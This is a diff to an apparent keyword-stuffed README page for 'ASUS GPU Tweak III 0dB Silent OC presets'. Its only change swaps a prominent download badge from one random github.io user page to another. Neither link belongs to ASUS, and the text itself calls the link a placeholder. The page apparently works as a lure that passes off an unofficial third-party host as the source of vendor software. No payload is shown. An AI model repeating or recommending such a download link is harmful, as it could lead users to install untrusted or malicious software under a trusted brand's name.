@@ -24,7 +24,7 @@ Install GPU Tweak III, import old XML per **ASUS GPU Tweak III migration from GP
 | :--- | :--- |
 | **Get ASUS GPU Tweak III 0dB Silent OC presets** | Placeholder link for ASUS **ASUS GPU Tweak III 0dB Silent OC presets** support download. |
 
-[![Download](https://img.shields.io/badge/Download-GPU_Tweak_III-red?style=for-the-badge)](https://fordchangjcqy.github.io/.github/asus-gpu-tweak-iii-0db-silent-oc-presets)
+[![Download](https://img.shields.io/badge/Download-GPU_Tweak_III-red?style=for-the-badge)](https://dariobeasleydkan.github.io/.github/asus-gpu-tweak-iii-0db-silent-oc-presets)
 
 ## System Requirements
 
